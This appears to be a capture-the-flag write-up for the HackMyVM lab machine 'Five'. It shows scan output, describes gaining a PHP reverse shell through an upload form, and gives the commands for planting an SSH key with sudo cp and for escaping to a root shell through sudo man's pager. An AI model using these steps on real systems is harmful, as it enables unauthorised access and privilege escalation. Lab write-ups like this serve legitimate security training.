---
layout: post
author: maxin
title:  "Five"
date:   2022-01-01 09:27:06 PM -03
category: HackMyVM
---

[HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Five)

# Enumeration

{% highlight text  %}
# Nmap 7.92 scan initiated Tue Dec 28 20:31:18 2021 as: nmap -sC -sV -v -oN nmap 192.168.0.250
Nmap scan report for 192.168.0.250
Host is up (0.018s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.2
| http-robots.txt: 1 disallowed entry 
|_/admin
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.14.2
|_http-title: 403 Forbidden

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec 28 20:31:25 2021 -- 1 IP address (1 host up) scanned in 6.87 seconds
{% endhighlight  %}

# Port 80

Home page return a 403 code. So start to fuzzing

{% highlight bash %}
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.170
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2021/12/29 14:35:09 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 185] [--> http://192.168.0.170/uploads/]
/admin                (Status: 301) [Size: 185] [--> http://192.168.0.170/admin/]  
/upload.php           (Status: 200) [Size: 48]                                     
/upload.html          (Status: 200) [Size: 346]                                    
/robots.txt           (Status: 200) [Size: 17]
{% endhighlight  %}

## upload.html

![Untitled](/images/five/upload.png)

Upload a php reverse shell 

Intercept the request and go to the final of the request. Change the `uploads/` to `./` a

![Untitled](/images/five/reverse1.png) | ![Untitled](/images/five/reverse2.png)

Start the listerner and access `$IP/reverse.php`

![Untitled](/images/five/reverse3.png)

# User

{% highlight bash %}
sudo -l
User www-data may run the following commands on five:
    (melisa) NOPASSWD: /bin/cp
{% endhighlight  %}

Putting our private key to melisa’s authorized_keys

{% highlight bash  %}
ssh-keygen -f melisa
sudo -u melisa cp melisa.pub /home/melisa/.ssh/authorized_keys
{% endhighlight  %}

### SSH

Has a service running on port 4444

{% highlight bash  %}
netstat -tunlp
tcp        0      0 127.0.0.1:4444          0.0.0.0:*               LISTEN      -
{% endhighlight  %}

We can check using nc

![Untitled](/images/five/port4444.png)

{% highlight bash  %}
ssh -i melisa melisa@127.0.0.1 -p 4444
{% endhighlight  %}

# Root

{% highlight bash %}
sudo -l

User melisa may run the following commands on five:
    (ALL) SETENV: NOPASSWD: /bin/pwd, /bin/arch, /bin/man, /bin/id, /bin/rm, /bin/clear
{% endhighlight  %}

We can use man binary to spawn a shell has a root

{% highlight bash  %}
sudo man -P less man # -P it's use to select the pager 
!/bin/sh 
{% endhighlight  %}